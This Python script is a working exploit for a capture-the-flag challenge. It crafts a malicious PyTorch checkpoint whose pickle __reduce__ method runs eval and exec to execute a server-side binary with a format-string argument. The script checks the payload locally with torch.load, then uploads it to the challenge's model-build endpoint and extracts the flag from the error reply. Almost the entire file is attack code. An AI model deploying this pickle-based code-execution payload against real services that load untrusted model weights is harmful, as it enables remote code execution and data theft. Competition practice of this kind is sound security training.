#!/usr/bin/env python3

from __future__ import annotations

import argparse
import binascii
import json
import mimetypes
import re
import subprocess
import sys
from pathlib import Path
from urllib import error
from urllib import request


ROOT = Path("/root/squ1rrel2026CTF/yolo")
EXTRACTED = ROOT / "starting_files" / "extracted"
PAYLOAD_PT = ROOT / "artifacts" / "payload.pt"
TORCH_PYTHON = Path("/root/mlinfer/bin/python")
REMOTE_URL = "https://yolo.squ1rrel.dev/api/model/build"
FLAG_RE = re.compile(r"squ1rrel\{[^\n\r}]+\}")


def build_payload(binary_path: str) -> None:
    generator = f'''
import torch

class Exploit:
    def __reduce__(self):
        expr = "__import__('builtins').exec(\\\"raise Exception(__import__('subprocess').check_output([{binary_path!r}, '%41$s']).decode())\\\")"
        return (eval, (expr,))

torch.save(Exploit(), {str(PAYLOAD_PT)!r})
'''
    subprocess.run(
        [str(TORCH_PYTHON), "-c", generator],
        check=True,
        cwd=ROOT,
    )


def validate_local() -> str:
    build_payload(str(EXTRACTED / "yolo_status"))
    validator = (
        "import torch,sys; "
        f"path={str(PAYLOAD_PT)!r}; "
        "\ntry:\n"
        "    torch.load(path, map_location='cpu', weights_only=False)\n"
        "except Exception as exc:\n"
        "    print(exc)\n"
    )
    result = subprocess.run(
        [str(TORCH_PYTHON), "-c", validator],
        check=True,
        capture_output=True,
        text=True,
        cwd=ROOT,
    )
    return result.stdout.strip()


def post_file(url: str, field_name: str, file_path: Path) -> dict:
    boundary = f"----yolo{binascii.hexlify(file_path.read_bytes()[:8]).decode() or 'payload'}"
    content_type = mimetypes.guess_type(file_path.name)[0] or "application/octet-stream"

    body = bytearray()
    body.extend(f"--{boundary}\r\n".encode())
    body.extend(
        (
            f'Content-Disposition: form-data; name="{field_name}"; '
            f'filename="{file_path.name}"\r\n'
        ).encode()
    )
    body.extend(f"Content-Type: {content_type}\r\n\r\n".encode())
    body.extend(file_path.read_bytes())
    body.extend(f"\r\n--{boundary}--\r\n".encode())

    req = request.Request(
        url,
        data=bytes(body),
        headers={
            "Accept": "application/json",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://yolo.squ1rrel.dev",
            "Referer": "https://yolo.squ1rrel.dev/",
            "User-Agent": "Mozilla/5.0",
        },
        method="POST",
    )
    try:
        with request.urlopen(req, timeout=30) as response:
            return json.loads(response.read().decode())
    except error.HTTPError as exc:
        return json.loads(exc.read().decode())


def exploit_remote() -> tuple[str, dict]:
    build_payload("/app/yolo_status")
    data = post_file(REMOTE_URL, "weights", PAYLOAD_PT)
    error_text = data.get("error", "")
    match = FLAG_RE.search(error_text)
    if not match:
        raise RuntimeError(f"flag not found in response: {json.dumps(data)}")
    return match.group(0), data


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=["local", "remote"])
    args = parser.parse_args()

    if args.mode == "local":
        print(validate_local())
        return 0

    flag, data = exploit_remote()
    print(flag)
    print(json.dumps(data, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())